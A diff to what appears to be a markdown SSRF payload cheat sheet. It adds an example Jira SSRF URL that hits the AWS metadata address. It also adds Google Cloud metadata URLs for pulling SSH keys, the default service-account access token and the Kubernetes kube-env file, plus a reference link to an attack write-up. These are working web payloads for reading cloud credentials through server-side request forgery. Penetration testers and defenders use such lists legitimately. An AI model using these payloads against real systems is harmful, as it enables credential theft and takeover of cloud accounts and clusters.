@@ -330,6 +330,8 @@ http://169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key
 http://169.254.169.254/latest/meta-data/iam/security-credentials/dummy
 ```
 
+E.g: Jira SSRF leading to AWS info disclosure - `https://help.redacted.com/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/metadata/v1/maintenance`
+
 ### SSRF URL for Google Cloud
 
 Requires the header "Metadata-Flavor: Google" or "X-Google-Metadata-Request: True"
@@ -355,6 +357,12 @@ Beta does NOT require a header atm (thanks Mathias Karlsson @avlidienbrunn)
 http://metadata.google.internal/computeMetadata/v1beta1/
 http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
 ```
+
+Interesting files to pull out:
+
+- SSH Public Key : `http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json`
+- Get Access Token : `http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token`
+- Kubernetes Key : `http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env?alt=json`
 
 ### SSRF URL for Digital Ocean
 
@@ -478,3 +486,4 @@ More info: https://rancher.com/docs/rancher/v1.6/en/rancher-services/metadata-se
 - [How I convert SSRF to xss in a ssrf vulnerable Jira](https://medium.com/@D0rkerDevil/how-i-convert-ssrf-to-xss-in-a-ssrf-vulnerable-jira-e9f37ad5b158)
 - [Piercing the Veil: Server Side Request Forgery to NIPRNet access](https://medium.com/bugbountywriteup/piercing-the-veil-server-side-request-forgery-to-niprnet-access-c358fd5e249a)
 - [Hacker101 SSRF](https://www.youtube.com/watch?v=66ni2BTIjS8)
+- [SSRF脆弱性を利用したGCE/GKEインスタンスへの攻撃例](https://blog.ssrf.in/post/example-of-attack-on-gce-and-gke-instance-using-ssrf-vulnerability/)
